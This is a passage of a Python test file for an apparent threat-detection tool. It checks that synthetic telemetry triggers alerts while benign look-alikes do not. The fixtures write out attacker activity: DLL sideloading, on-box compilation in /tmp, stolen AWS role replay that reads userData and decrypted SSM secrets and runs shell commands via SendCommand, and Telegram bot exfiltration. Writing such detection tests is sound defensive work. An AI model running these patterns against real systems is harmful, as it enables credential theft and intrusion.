    c_cms = scan_telemetry_file(_write_jsonl(tmp_path / "cms_bypass.jsonl", cms_bypass))
    assert any("web_ssrf_or_upload_webshell" in c.reasons for c in c_cms)

    # 2. Relocated edge.exe + config.bin outside Program Files -> caught; normal Program Files msedge.exe -> 0 FP
    sideload = [
        {
            "timestamp": _iso(t),
            "source_host": "srv-app-20",
            "actor": "svc-app",
            "event_type": "process",
            "surface": "endpoint",
            "process": r"C:\ProgramData\cache\edge.exe",
            "parent_process": "cmd.exe",
            "command_line": r"C:\ProgramData\cache\edge.exe --cfg C:\ProgramData\cache\config.bin",
            "action": "process_create",
        }
    ]
    c_sl = scan_telemetry_file(_write_jsonl(tmp_path / "relocated_sideload.jsonl", sideload))
    assert c_sl and "dll_sideload_relocated_binary_with_config" in c_sl[0].reasons

    benign_edge = [
        {
            **sideload[0],
            "source_host": "wkstn-01",
            "process": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            "command_line": r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" https://intranet.corp.local',
        }
    ]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_edge.jsonl", benign_edge)) == []

    # 3. On-box /tmp C compiler on server -> caught; developer laptop /tmp gcc -> 0 FP
    srv_gcc = [
        {
            "timestamp": _iso(t),
            "source_host": "web-srv-08",
            "actor": "www-data",
            "event_type": "process",
            "surface": "endpoint",
            "process": "gcc",
            "parent_process": "sh",
            "command_line": "gcc -O3 /tmp/worker.c -lcrypto -o /tmp/worker",
            "action": "process_create",
        }
    ]
    c_gcc = scan_telemetry_file(_write_jsonl(tmp_path / "srv_gcc.jsonl", srv_gcc))
    assert c_gcc and "on_box_compiler_in_staging_path" in c_gcc[0].reasons

    laptop_gcc = [{**srv_gcc[0], "source_host": "laptop-dev-05", "actor": "dev"}]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "laptop_gcc.jsonl", laptop_gcc)) == []


def test_cyberstrikeai_cloudtrail_subsecond_burst_multi_identity_and_14day_dormant_gap(tmp_path: Path) -> None:
    """Elastic CyberStrikeAI CloudTrail report: 141ms userData burst, EC2 role replay, 3+ identities, and 14-day pause."""
    from artex_defense.detectors import correlate_kill_chains

    t_day1 = datetime(2026, 10, 1, 10, 0, 0, tzinfo=timezone.utc)
    t_day15 = t_day1 + timedelta(days=14)
    ext_ip = "203.0.113.235"

    events = [
        # Day 1: 12 AWS API calls in 0.24s (sub-second micro-burst) using stolen EC2 instance role from external IP
        {
            "timestamp": _iso(t_day1 + timedelta(milliseconds=i * 20)),
            "source_host": ext_ip,
            "actor": "arn:aws:sts::111122223333:assumed-role/AppRole/i-0abcdef1234567890",
            "event_type": "cloudtrail",
            "surface": "cloud_iam",
            "dest_host": "ec2.amazonaws.com",
            "user_agent": "Boto3/1.35.0",
            "status_code": 200,
            "action": "DescribeInstanceAttribute",
            "command_line": f"attribute=userData instanceId=i-000{i}",
        }
        for i in range(12)
    ] + [
        # Day 15 (14-day dormant gap!): Same external IP returns with 2 more stolen IAM users & runs SSM SendCommand
        {
            "timestamp": _iso(t_day15),
            "source_host": ext_ip,
            "actor": "arn:aws:iam::111122223333:user/ci-deployer",
            "event_type": "cloudtrail",
            "surface": "cloud_iam",
            "dest_host": "ssm.amazonaws.com",
            "user_agent": "Boto3/1.35.0",
            "status_code": 200,
            "action": "GetParametersByPath",
            "command_line": "Path=/prod/ WithDecryption=true",
        },
        {
            "timestamp": _iso(t_day15 + timedelta(seconds=5)),
            "source_host": ext_ip,
            "actor": "arn:aws:iam::111122223333:user/ops-admin",
            "event_type": "cloudtrail",
            "surface": "cloud_iam",
            "dest_host": "ssm.amazonaws.com",
            "user_agent": "Boto3/1.35.0",
            "status_code": 200,
            "action": "SendCommand",
            "command_line": "DocumentName=AWS-RunShellScript",
        },
    ]

    cands = scan_telemetry_file(_write_jsonl(tmp_path / "cyberstrike_14d.jsonl", events))
    all_reasons = {r for c in cands for r in c.reasons}
    assert "cloud_ec2_userdata_or_ssm_burst" in all_reasons
    assert "cloud_ec2_role_external_replay" in all_reasons
    assert "cloud_multi_identity_from_single_ip" in all_reasons

    # Correlator MUST stitch the Day 1 and Day 15 windows into a KC-LONG-* storyline across the 14-day dormant gap!
    storylines = correlate_kill_chains(cands, horizon_minutes=180, long_horizon_days=30)
    long_kc = [s for s in storylines if s.storyline_id.startswith("KC-LONG-")]
    assert long_kc, f"Expected long-horizon dormant-gap storyline across 14d gap: {storylines}"
    assert any("long_horizon_dormant_gap_days:" in ind for ind in long_kc[0].combined_indicators)


def test_hermes_agent_telegram_c2_egress_server_vs_workstation(tmp_path: Path) -> None:
    """Server calling api.telegram.org triggers alert; developer laptop calling Telegram produces 0 FPs."""
    t = datetime(2026, 11, 21, 16, 10, 0, tzinfo=timezone.utc)
    srv_ev = [
        {
            "timestamp": _iso(t),
            "source_host": "app-srv-21",
            "actor": "www-data",
            "event_type": "network",
            "surface": "network",
            "dest_host": "api.telegram.org",
            "dest_port": 443,
            "http_method": "POST",
            "http_path": "/bot123456:token/sendMessage",
            "status_code": 200,
        }
    ]
    c_srv = scan_telemetry_file(_write_jsonl(tmp_path / "hermes_tg_srv.jsonl", srv_ev))
    assert c_srv and "webhook_exfil_egress" in c_srv[0].reasons and c_srv[0].alert_tier == "alert"

    wkstn_ev = [{**srv_ev[0], "source_host": "laptop-user-03", "actor": "alice"}]
    assert scan_telemetry_file(_write_jsonl(tmp_path / "benign_tg_laptop.jsonl", wkstn_ev)) == []
